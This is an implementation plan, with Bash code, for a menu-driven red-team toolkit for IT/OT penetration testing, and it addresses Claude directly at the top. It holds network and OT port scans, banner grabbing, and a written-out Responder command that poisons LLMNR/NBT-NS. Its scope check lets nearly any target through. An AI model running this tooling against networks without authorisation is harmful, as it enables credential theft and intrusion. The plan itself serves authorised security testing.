# Red Team Toolkit v2.0 Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a modular swiss-army-knife payload for IT/OT pentesting with standalone + laptop-assisted modes.

**Architecture:** Menu-driven payload with modular scripts organized by domain (discovery, ot-protocols, credentials, laptop). Config file per engagement. Tool fallback chains for standalone vs laptop operation.

**Tech Stack:** Bash, DuckyScript commands, SSH, common pentest tools (nmap, arp-scan, mbpoll, Responder, etc.)

**Verification:** `bash -n` for syntax, `shellcheck` for linting. No traditional unit tests for bash payloads.

---

## Phase 1: Foundation

### Task 1.1: Create Directory Structure

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/config.sh`
- Create: `library/user/general/red-team-toolkit/scripts/menu.sh`
- Create: `library/user/general/red-team-toolkit/scripts/modules/discovery/.gitkeep`
- Create: `library/user/general/red-team-toolkit/scripts/modules/ot-protocols/.gitkeep`
- Create: `library/user/general/red-team-toolkit/scripts/modules/credentials/.gitkeep`
- Create: `library/user/general/red-team-toolkit/scripts/modules/laptop/.gitkeep`
- Create: `library/user/general/red-team-toolkit/wordlists/.gitkeep`

**Step 1: Create directory structure**

```bash
cd library/user/general/red-team-toolkit
mkdir -p scripts/modules/{discovery,ot-protocols,credentials,laptop}
mkdir -p wordlists
touch scripts/modules/discovery/.gitkeep
touch scripts/modules/ot-protocols/.gitkeep
touch scripts/modules/credentials/.gitkeep
touch scripts/modules/laptop/.gitkeep
touch wordlists/.gitkeep
```

**Step 2: Commit**

```bash
git add -A
git commit -m "chore: create red-team-toolkit v2 directory structure"
```

---

### Task 1.2: Create Engagement Config File

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/config.sh`

**Step 1: Write config.sh**

```bash
#!/bin/bash
# Engagement Configuration
# Edit these values at the start of each engagement

# === ENGAGEMENT IDENTITY ===
ENGAGEMENT_NAME="${ENGAGEMENT_NAME:-default}"

# === SCOPE CONTROLS ===
TARGET_NETWORK="${TARGET_NETWORK:-192.168.1.0/24}"
EXCLUDE_IPS="${EXCLUDE_IPS:-}"
OT_NETWORK="${OT_NETWORK:-}"

# === SAFETY CONTROLS ===
SAFE_MODE="${SAFE_MODE:-1}"
PASSIVE_ONLY="${PASSIVE_ONLY:-0}"
MAX_DURATION_SEC="${MAX_DURATION_SEC:-300}"

# === WIFI SCOPE ===
CHANNEL_ALLOWLIST="${CHANNEL_ALLOWLIST:-1 6 11}"
BSSID_SCOPE="${BSSID_SCOPE:-}"

# === LAPTOP INTEGRATION ===
LAPTOP_ENABLED="${LAPTOP_ENABLED:-0}"
LAPTOP_HOST="${LAPTOP_HOST:-}"
LAPTOP_KEY="${LAPTOP_KEY:-/root/.ssh/id_rsa}"
LAPTOP_TOOLS_DIR="${LAPTOP_TOOLS_DIR:-/opt/tools}"
LAPTOP_RESULTS_DIR="${LAPTOP_RESULTS_DIR:-/tmp/pager-results}"

# === PATHS (computed) ===
TOOLKIT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACT_DIR="${TOOLKIT_DIR}/artifacts/${ENGAGEMENT_NAME}"
LOG_DIR="${TOOLKIT_DIR}/logs/${ENGAGEMENT_NAME}"

# Export for subshells
export ENGAGEMENT_NAME TARGET_NETWORK EXCLUDE_IPS OT_NETWORK
export SAFE_MODE PASSIVE_ONLY MAX_DURATION_SEC
export CHANNEL_ALLOWLIST BSSID_SCOPE
export LAPTOP_ENABLED LAPTOP_HOST LAPTOP_KEY LAPTOP_TOOLS_DIR LAPTOP_RESULTS_DIR
export TOOLKIT_DIR ARTIFACT_DIR LOG_DIR
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/config.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/config.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/config.sh
git commit -m "feat: add engagement config file with scope and safety controls"
```

---

### Task 1.3: Create Menu Helper Functions

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/menu.sh`

**Step 1: Write menu.sh**

```bash
#!/bin/bash
# Menu rendering and navigation helpers

# Display status bar at top of menus
show_status_bar() {
  local safe_str="OFF"
  local laptop_str="OFF"
  local passive_str="OFF"
  
  [[ "$SAFE_MODE" -eq 1 ]] && safe_str="ON"
  [[ "$LAPTOP_ENABLED" -eq 1 ]] && laptop_str="ON"
  [[ "$PASSIVE_ONLY" -eq 1 ]] && passive_str="ON"
  
  LOG blue "[$ENGAGEMENT_NAME] SAFE:$safe_str LAPTOP:$laptop_str PASSIVE:$passive_str"
  LOG blue "SCOPE: ${TARGET_NETWORK:-any}"
}

# Generic menu picker
# Usage: choice=$(menu_pick "Title" "Option1" "Option2" ...)
menu_pick() {
  local title="$1"; shift
  local options=("$@")
  local i=1
  
  LOG ""
  LOG blue "=== $title ==="
  show_status_bar
  LOG ""
  
  for opt in "${options[@]}"; do
    LOG "$i) $opt"
    ((i++))
  done
  LOG "0) Back"
  LOG ""
  
  local choice
  choice=$(NUMBER_PICKER "Select" 1)
  case $? in
    "$DUCKYSCRIPT_CANCELLED") echo "0"; return ;;
    "$DUCKYSCRIPT_REJECTED")  echo "0"; return ;;
    "$DUCKYSCRIPT_ERROR")     echo "0"; return ;;
  esac
  echo "$choice"
}

# Confirm before dangerous action (respects SAFE_MODE)
confirm_danger() {
  local msg="$1"
  
  if [[ "$SAFE_MODE" -eq 0 ]]; then
    return 0
  fi
  
  local resp
  resp=$(CONFIRMATION_DIALOG "[SAFE_MODE] $msg")
  case $? in
    "$DUCKYSCRIPT_REJECTED") return 1 ;;
    "$DUCKYSCRIPT_ERROR")    return 1 ;;
  esac
  
  case "$resp" in
    "$DUCKYSCRIPT_USER_CONFIRMED") return 0 ;;
    *) return 1 ;;
  esac
}

# Check if passive-only mode blocks an action
check_passive() {
  if [[ "$PASSIVE_ONLY" -eq 1 ]]; then
    LOG red "PASSIVE_ONLY mode enabled - active attacks blocked"
    return 1
  fi
  return 0
}

# Check if target is in scope
in_scope() {
  local target="$1"
  
  # If no scope defined, everything is in scope
  [[ -z "$TARGET_NETWORK" ]] && return 0
  
  # Check exclusions first
  if [[ -n "$EXCLUDE_IPS" ]]; then
    for excluded in ${EXCLUDE_IPS//,/ }; do
      [[ "$target" == "$excluded" ]] && return 1
    done
  fi
  
  # Basic check - could be enhanced with ipcalc
  return 0
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/menu.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/menu.sh`
Expected: No errors (or minor warnings only)

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/menu.sh
git commit -m "feat: add menu helper functions with status bar and safety checks"
```

---

### Task 1.4: Create Laptop SSH Wrapper

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/laptop/ssh_exec.sh`

**Step 1: Write ssh_exec.sh**

```bash
#!/bin/bash
# Laptop SSH execution wrapper

# Execute command on laptop
# Usage: laptop_exec "command"
laptop_exec() {
  local cmd="$1"
  
  if [[ "$LAPTOP_ENABLED" -eq 0 ]]; then
    LOG red "Laptop mode not enabled. Set LAPTOP_ENABLED=1 in config."
    return 1
  fi
  
  if [[ -z "$LAPTOP_HOST" ]]; then
    LOG red "LAPTOP_HOST not configured"
    return 1
  fi
  
  local ssh_opts="-o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new"
  
  if [[ -n "$LAPTOP_KEY" && -f "$LAPTOP_KEY" ]]; then
    ssh_opts="$ssh_opts -i $LAPTOP_KEY"
  fi
  
  # shellcheck disable=SC2086
  ssh $ssh_opts "$LAPTOP_HOST" "$cmd"
}

# Execute command on laptop in background, return PID
# Usage: pid=$(laptop_exec_bg "long-running-command")
laptop_exec_bg() {
  local cmd="$1"
  local log_file="${2:-/tmp/pager-bg.log}"
  
  laptop_exec "mkdir -p '$LAPTOP_RESULTS_DIR' && nohup $cmd > '$log_file' 2>&1 & echo \$!"
}

# Check if laptop is reachable
laptop_ping() {
  if [[ "$LAPTOP_ENABLED" -eq 0 ]]; then
    return 1
  fi
  
  laptop_exec "echo ok" >/dev/null 2>&1
}

# Fetch file from laptop to local
# Usage: laptop_fetch "/remote/path" "/local/path"
laptop_fetch() {
  local remote_path="$1"
  local local_path="$2"
  
  if [[ "$LAPTOP_ENABLED" -eq 0 ]]; then
    LOG red "Laptop mode not enabled"
    return 1
  fi
  
  local scp_opts="-o BatchMode=yes -o ConnectTimeout=5"
  
  if [[ -n "$LAPTOP_KEY" && -f "$LAPTOP_KEY" ]]; then
    scp_opts="$scp_opts -i $LAPTOP_KEY"
  fi
  
  # shellcheck disable=SC2086
  scp $scp_opts "$LAPTOP_HOST:$remote_path" "$local_path"
}

# Fetch all results from laptop results directory
laptop_fetch_results() {
  local local_dir="${1:-$ARTIFACT_DIR}"
  
  mkdir -p "$local_dir"
  laptop_fetch "$LAPTOP_RESULTS_DIR/*" "$local_dir/" 2>/dev/null || true
}

# Run command with laptop fallback
# Usage: run_with_fallback "local_cmd" "laptop_cmd"
run_with_fallback() {
  local local_cmd="$1"
  local laptop_cmd="${2:-$1}"
  
  # Try local first
  local local_bin
  local_bin=$(echo "$local_cmd" | awk '{print $1}')
  
  if have "$local_bin"; then
    eval "$local_cmd"
    return $?
  fi
  
  # Fall back to laptop
  if [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    LOG blue "Running on laptop: $laptop_cmd"
    laptop_exec "$laptop_cmd"
    return $?
  fi
  
  LOG red "Tool '$local_bin' not available locally and laptop mode disabled"
  return 1
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/laptop/ssh_exec.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/laptop/ssh_exec.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/laptop/ssh_exec.sh
git commit -m "feat: add laptop SSH execution wrapper with fallback support"
```

---

### Task 1.5: Refactor Main payload.sh with New Menu System

**Files:**
- Modify: `library/user/general/red-team-toolkit/payload.sh`

**Step 1: Rewrite payload.sh**

```bash
#!/bin/bash
# Title: Red Team Toolkit v2.0
# Description: Swiss-army-knife payload for IT/OT penetration testing
# Author: YourTeam
# Version: 2.0
# Category: general
# Net Mode: NAT
#
# LED States
# - Blue: Menu / idle
# - Amber: Working
# - Green: Success
# - Red: Error

set -euo pipefail

# Resolve script directory
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Source configuration and helpers
source "$DIR/scripts/config.sh"
source "$DIR/scripts/common.sh"
source "$DIR/scripts/menu.sh"
source "$DIR/scripts/modules/laptop/ssh_exec.sh"

# Ensure artifact directories exist
ensure_dir "$ARTIFACT_DIR" "$LOG_DIR"

# Source module files
for module_dir in discovery ot-protocols credentials wireless physical laptop; do
  if [[ -d "$DIR/scripts/modules/$module_dir" ]]; then
    for f in "$DIR/scripts/modules/$module_dir"/*.sh; do
      [[ -f "$f" ]] && source "$f"
    done
  fi
done

# === SUBMENUS ===

menu_discovery() {
  while true; do
    local choice
    choice=$(menu_pick "Discovery & Mapping" \
      "ARP/Network Scan" \
      "Port Scan" \
      "Service Identification" \
      "OT Device Fingerprint" \
      "View Asset Inventory")
    
    case "$choice" in
      1) have rt_net_scan && rt_net_scan || LOG red "Module not implemented" ;;
      2) have rt_port_scan && rt_port_scan || LOG red "Module not implemented" ;;
      3) have rt_service_id && rt_service_id || LOG red "Module not implemented" ;;
      4) have rt_ot_fingerprint && rt_ot_fingerprint || LOG red "Module not implemented" ;;
      5) have rt_asset_inventory && rt_asset_inventory || LOG red "Module not implemented" ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_ot_protocols() {
  while true; do
    local choice
    choice=$(menu_pick "OT Protocol Attacks" \
      "Modbus/TCP" \
      "EtherNet/IP (CIP)" \
      "OPC UA" \
      "DNP3" \
      "PROFINET" \
      "IEC 61850" \
      "BACnet" \
      "S7comm")
    
    case "$choice" in
      1) have rt_modbus && rt_modbus || LOG red "Module not implemented" ;;
      2) have rt_enip_cip && rt_enip_cip || LOG red "Module not implemented" ;;
      3) have rt_opcua && rt_opcua || LOG red "Module not implemented" ;;
      4) have rt_dnp3 && rt_dnp3 || LOG red "Module not implemented" ;;
      5) have rt_profinet && rt_profinet || LOG red "Module not implemented" ;;
      6) have rt_iec61850 && rt_iec61850 || LOG red "Module not implemented" ;;
      7) have rt_bacnet && rt_bacnet || LOG red "Module not implemented" ;;
      8) have rt_s7comm && rt_s7comm || LOG red "Module not implemented" ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_credentials() {
  while true; do
    local choice
    choice=$(menu_pick "Credential Harvesting" \
      "Default Credential Check" \
      "SNMP Enumeration" \
      "Passive Hash Capture" \
      "Responder (laptop)" \
      "NTLM Relay (laptop)" \
      "Protocol Auth Sniff")
    
    case "$choice" in
      1) have rt_default_creds && rt_default_creds || LOG red "Module not implemented" ;;
      2) have rt_snmp_enum && rt_snmp_enum || LOG red "Module not implemented" ;;
      3) have rt_hash_capture && rt_hash_capture || LOG red "Module not implemented" ;;
      4) have rt_responder && rt_responder || LOG red "Module not implemented" ;;
      5) have rt_ntlm_relay && rt_ntlm_relay || LOG red "Module not implemented" ;;
      6) have rt_protocol_auth && rt_protocol_auth || LOG red "Module not implemented" ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_wireless() {
  while true; do
    local choice
    choice=$(menu_pick "Wireless Attacks" \
      "Passive Recon" \
      "Handshake Capture" \
      "Deauth Watch")
    
    case "$choice" in
      1) have rt_passive_recon && rt_passive_recon "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" "$CHANNEL_ALLOWLIST" "$MAX_DURATION_SEC" "$BSSID_SCOPE" || LOG red "Module error" ;;
      2) 
        if confirm_danger "Handshake capture may send deauth frames. Continue?"; then
          have rt_handshake_capture && rt_handshake_capture "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" "$CHANNEL_ALLOWLIST" "$MAX_DURATION_SEC" "$BSSID_SCOPE" || LOG red "Module error"
        fi
        ;;
      3) have rt_deauth_watch && rt_deauth_watch "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" "$CHANNEL_ALLOWLIST" "$MAX_DURATION_SEC" "$BSSID_SCOPE" || LOG red "Module error" ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_physical() {
  while true; do
    local choice
    choice=$(menu_pick "Physical/Serial" \
      "RS485 Serial Monitor" \
      "CAN Bus Monitor" \
      "RTL-SDR")
    
    case "$choice" in
      1) have rt_rs485_serial && rt_rs485_serial "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" || LOG red "Module error" ;;
      2) have rt_can_monitor && rt_can_monitor "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" || LOG red "Module error" ;;
      3) have rt_rtl_sdr && rt_rtl_sdr "$DIR" "$ARTIFACT_DIR" "$LOG_DIR" || LOG red "Module error" ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_laptop() {
  while true; do
    local choice
    choice=$(menu_pick "Laptop Tools" \
      "Test Connection" \
      "Run Nmap Scan" \
      "Run Responder" \
      "Fetch Results" \
      "Configure Laptop")
    
    case "$choice" in
      1)
        if laptop_ping; then
          LOG green "Laptop connection OK"
        else
          LOG red "Cannot reach laptop"
        fi
        ;;
      2)
        local target
        target=$(IP_PICKER "Target" "${TARGET_NETWORK%%/*}")
        case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") continue ;; esac
        run_with_fallback "nmap -sV $target" "nmap -sV $target -oA $LAPTOP_RESULTS_DIR/nmap_scan"
        ;;
      3)
        if ! check_passive; then continue; fi
        if confirm_danger "Start Responder? This will poison LLMNR/NBT-NS."; then
          laptop_exec_bg "responder -I eth0 -wrf" "$LAPTOP_RESULTS_DIR/responder.log"
          LOG green "Responder started in background"
        fi
        ;;
      4) laptop_fetch_results && LOG green "Results fetched to $ARTIFACT_DIR" ;;
      5)
        LOG "Current config:"
        LOG "  LAPTOP_ENABLED=$LAPTOP_ENABLED"
        LOG "  LAPTOP_HOST=$LAPTOP_HOST"
        LOG "  LAPTOP_KEY=$LAPTOP_KEY"
        LOG ""
        LOG "Edit scripts/config.sh to change"
        ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

menu_configure() {
  while true; do
    local choice
    choice=$(menu_pick "Configure Engagement" \
      "Set Engagement Name" \
      "Set Target Network" \
      "Toggle SAFE_MODE" \
      "Toggle PASSIVE_ONLY" \
      "Toggle Laptop Mode" \
      "View Current Config")
    
    case "$choice" in
      1)
        local name
        name=$(TEXT_PICKER "Engagement Name" "$ENGAGEMENT_NAME")
        case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") continue ;; esac
        export ENGAGEMENT_NAME="$name"
        ARTIFACT_DIR="${TOOLKIT_DIR}/artifacts/${ENGAGEMENT_NAME}"
        LOG_DIR="${TOOLKIT_DIR}/logs/${ENGAGEMENT_NAME}"
        ensure_dir "$ARTIFACT_DIR" "$LOG_DIR"
        LOG green "Engagement: $ENGAGEMENT_NAME"
        ;;
      2)
        local net
        net=$(TEXT_PICKER "Target Network (CIDR)" "$TARGET_NETWORK")
        case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") continue ;; esac
        export TARGET_NETWORK="$net"
        LOG green "Target: $TARGET_NETWORK"
        ;;
      3)
        if [[ "$SAFE_MODE" -eq 1 ]]; then
          export SAFE_MODE=0
          LOG "SAFE_MODE: OFF (dangerous actions allowed)"
        else
          export SAFE_MODE=1
          LOG "SAFE_MODE: ON (confirmations required)"
        fi
        ;;
      4)
        if [[ "$PASSIVE_ONLY" -eq 1 ]]; then
          export PASSIVE_ONLY=0
          LOG "PASSIVE_ONLY: OFF (active attacks allowed)"
        else
          export PASSIVE_ONLY=1
          LOG "PASSIVE_ONLY: ON (active attacks blocked)"
        fi
        ;;
      5)
        if [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
          export LAPTOP_ENABLED=0
          LOG "Laptop Mode: OFF"
        else
          export LAPTOP_ENABLED=1
          LOG "Laptop Mode: ON"
        fi
        ;;
      6)
        LOG ""
        LOG "=== Current Configuration ==="
        LOG "Engagement: $ENGAGEMENT_NAME"
        LOG "Target Network: $TARGET_NETWORK"
        LOG "Exclude IPs: ${EXCLUDE_IPS:-none}"
        LOG "OT Network: ${OT_NETWORK:-not set}"
        LOG "SAFE_MODE: $SAFE_MODE"
        LOG "PASSIVE_ONLY: $PASSIVE_ONLY"
        LOG "LAPTOP_ENABLED: $LAPTOP_ENABLED"
        LOG "LAPTOP_HOST: ${LAPTOP_HOST:-not set}"
        LOG "Artifact Dir: $ARTIFACT_DIR"
        ;;
      0|"") return ;;
    esac
    
    PROMPT "Press button to continue"
  done
}

# === MAIN MENU ===

main_menu() {
  LOG green "Red Team Toolkit v2.0 loaded"
  LOG "Artifacts: $ARTIFACT_DIR"
  
  while true; do
    local choice
    choice=$(menu_pick "RED TEAM TOOLKIT v2.0" \
      "Discovery & Mapping" \
      "OT Protocol Attacks" \
      "Credential Harvesting" \
      "Wireless Attacks" \
      "Physical/Serial" \
      "Laptop Tools" \
      "---" \
      "Configure Engagement" \
      "Export Artifacts")
    
    case "$choice" in
      1) menu_discovery ;;
      2) menu_ot_protocols ;;
      3) menu_credentials ;;
      4) menu_wireless ;;
      5) menu_physical ;;
      6) menu_laptop ;;
      7) ;; # separator
      8) menu_configure ;;
      9)
        LOG "Artifacts in: $ARTIFACT_DIR"
        ls -la "$ARTIFACT_DIR" 2>/dev/null || LOG "No artifacts yet"
        PROMPT "Press button to continue"
        ;;
      0|"")
        LOG "Exiting toolkit"
        exit 0
        ;;
    esac
  done
}

# Entry point
main_menu
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/payload.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/payload.sh`
Expected: No errors (or minor warnings about DuckyScript commands)

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/payload.sh
git commit -m "feat: refactor payload.sh with v2 menu system and submenus"
```

---

### Task 1.6: Update common.sh with Additional Helpers

**Files:**
- Modify: `library/user/general/red-team-toolkit/scripts/common.sh`

**Step 1: Add new helper functions to common.sh**

Add the following to the end of the existing `common.sh`:

```bash
# === ADDITIONAL HELPERS FOR V2 ===

# Timestamp for filenames
ts() {
  date +%Y%m%d_%H%M%S
}

# Log to file and screen
log_both() {
  local msg="$1"
  local logfile="${2:-$LOG_DIR/toolkit.log}"
  echo "[$(date '+%H:%M:%S')] $msg" | tee -a "$logfile"
}

# Check if IP is valid format
is_valid_ip() {
  local ip="$1"
  [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
}

# Check if port is open (quick check)
port_open() {
  local host="$1"
  local port="$2"
  local timeout="${3:-2}"
  
  if have nc; then
    nc -z -w "$timeout" "$host" "$port" 2>/dev/null
  elif have bash; then
    timeout "$timeout" bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
  else
    return 1
  fi
}

# Get local IP address
get_local_ip() {
  ip -4 route get 8.8.8.8 2>/dev/null | awk '{print $7; exit}' || hostname -I 2>/dev/null | awk '{print $1}'
}

# Parse CIDR to get network range (basic)
cidr_to_range() {
  local cidr="$1"
  echo "${cidr%/*}"  # Just return base for now
}

# Kill background process by name pattern
kill_bg() {
  local pattern="$1"
  pkill -f "$pattern" 2>/dev/null || true
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/common.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/common.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/common.sh
git commit -m "feat: add additional helper functions to common.sh"
```

---

## Phase 2: Discovery Modules

### Task 2.1: Create Network Scan Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/discovery/net_scan.sh`

**Step 1: Write net_scan.sh**

```bash
#!/bin/bash
# Network scanning module - ARP scan, ping sweep, port scan

rt_net_scan() {
  local choice
  choice=$(menu_pick "Network Scan" \
    "ARP Scan (local subnet)" \
    "Ping Sweep" \
    "Quick Port Scan (top 100)" \
    "Full Port Scan (1-65535)")
  
  local target
  case "$choice" in
    1) rt_arp_scan ;;
    2|3|4)
      target=$(TEXT_PICKER "Target (IP or CIDR)" "$TARGET_NETWORK")
      case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
      
      if ! in_scope "${target%%/*}"; then
        LOG red "Target $target not in scope"
        return 1
      fi
      
      case "$choice" in
        2) rt_ping_sweep "$target" ;;
        3) rt_port_scan "$target" "quick" ;;
        4) rt_port_scan "$target" "full" ;;
      esac
      ;;
    0|"") return ;;
  esac
}

rt_arp_scan() {
  local outfile="$ARTIFACT_DIR/arp_scan_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Running ARP scan on local subnet..."
  
  if have arp-scan; then
    with_spinner "ARP scan" bash -c "arp-scan -l 2>/dev/null | tee '$outfile'"
  elif have nmap && [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    local subnet
    subnet=$(get_local_ip | sed 's/\.[0-9]*$/.0\/24/')
    run_with_fallback "" "nmap -sn -PR $subnet -oG -" | tee "$outfile"
  elif have ip; then
    LOG "Using ip neigh (cached only)"
    ip neigh show | tee "$outfile"
  else
    LOG red "No ARP scan tools available"
    return 1
  fi
  
  LOG green "Results: $outfile"
}

rt_ping_sweep() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/ping_sweep_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Ping sweep: $target"
  
  if have nmap; then
    with_spinner "Ping sweep" bash -c "nmap -sn '$target' -oG - | grep 'Up' | tee '$outfile'"
  elif have fping; then
    with_spinner "Ping sweep" bash -c "fping -a -g '$target' 2>/dev/null | tee '$outfile'"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    run_with_fallback "" "nmap -sn $target -oG $LAPTOP_RESULTS_DIR/ping.txt"
    laptop_fetch "$LAPTOP_RESULTS_DIR/ping.txt" "$outfile"
  else
    LOG red "No ping sweep tools available"
    return 1
  fi
  
  LOG green "Results: $outfile"
}

rt_port_scan() {
  local target="$1"
  local mode="${2:-quick}"
  local outfile="$ARTIFACT_DIR/port_scan_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  local ports
  if [[ "$mode" == "quick" ]]; then
    # Top OT/IT ports
    ports="21,22,23,25,80,102,443,445,502,993,995,1433,1521,1883,3306,3389,4840,5432,5900,8080,20000,44818,47808"
  else
    ports="1-65535"
  fi
  
  LOG blue "Port scan ($mode): $target"
  
  if have nmap; then
    with_spinner "Port scan" bash -c "nmap -Pn -p '$ports' '$target' -oG - | tee '$outfile'"
  elif have nc; then
    LOG "Using netcat (slow)"
    {
      for p in ${ports//,/ }; do
        if [[ "$p" =~ - ]]; then
          # Range - skip for nc
          continue
        fi
        if port_open "$target" "$p" 1; then
          echo "$target:$p open"
        fi
      done
    } | tee "$outfile"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    run_with_fallback "" "nmap -Pn -p $ports $target -oG $LAPTOP_RESULTS_DIR/ports.txt"
    laptop_fetch "$LAPTOP_RESULTS_DIR/ports.txt" "$outfile"
  else
    LOG red "No port scan tools available"
    return 1
  fi
  
  LOG green "Results: $outfile"
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/discovery/net_scan.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/discovery/net_scan.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/discovery/net_scan.sh
git commit -m "feat: add network scan module with ARP, ping sweep, port scan"
```

---

### Task 2.2: Create Service Identification Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/discovery/service_id.sh`

**Step 1: Write service_id.sh**

```bash
#!/bin/bash
# Service identification and banner grabbing

rt_service_id() {
  local target
  target=$(IP_PICKER "Target IP" "${TARGET_NETWORK%%/*}")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local choice
  choice=$(menu_pick "Service ID: $target" \
    "Banner Grab (common ports)" \
    "Full Service Scan (nmap -sV)" \
    "OT Port Check")
  
  case "$choice" in
    1) rt_banner_grab "$target" ;;
    2) rt_service_scan "$target" ;;
    3) rt_ot_port_check "$target" ;;
    0|"") return ;;
  esac
}

rt_banner_grab() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/banners_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  # Common ports to banner grab
  local ports=(21 22 23 25 80 110 143 443 445 993 995 3306 3389 5432 8080)
  
  LOG blue "Banner grabbing $target..."
  
  {
    for port in "${ports[@]}"; do
      if port_open "$target" "$port" 2; then
        echo "=== $target:$port ==="
        if have nc; then
          echo "" | nc -w 3 "$target" "$port" 2>/dev/null | head -5
        elif have bash; then
          timeout 3 bash -c "exec 3<>/dev/tcp/$target/$port; cat <&3" 2>/dev/null | head -5
        fi
        echo ""
      fi
    done
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

rt_service_scan() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/services_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Service scan: $target"
  
  if have nmap; then
    with_spinner "Service scan" bash -c "nmap -sV -Pn '$target' | tee '$outfile'"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    run_with_fallback "" "nmap -sV -Pn $target -oN $LAPTOP_RESULTS_DIR/services.txt"
    laptop_fetch "$LAPTOP_RESULTS_DIR/services.txt" "$outfile"
  else
    LOG red "nmap required for service scan"
    return 1
  fi
  
  LOG green "Results: $outfile"
}

rt_ot_port_check() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/ot_ports_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  # OT-specific ports
  declare -A ot_ports=(
    [102]="S7comm (Siemens)"
    [502]="Modbus/TCP"
    [2222]="EtherNet/IP (implicit)"
    [4840]="OPC UA"
    [4843]="OPC UA (secure)"
    [18245]="GE SRTP"
    [20000]="DNP3"
    [34962]="PROFINET RT"
    [34963]="PROFINET RT"
    [34964]="PROFINET RT"
    [44818]="EtherNet/IP (explicit)"
    [47808]="BACnet"
    [1911]="Niagara Fox"
    [9600]="OMRON FINS"
  )
  
  LOG blue "OT port check: $target"
  
  {
    echo "OT Port Scan: $target"
    echo "========================"
    for port in "${!ot_ports[@]}"; do
      local desc="${ot_ports[$port]}"
      if port_open "$target" "$port" 2; then
        echo "[OPEN] $port - $desc"
      fi
    done
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}
```

**Step 2: Verify syntax**

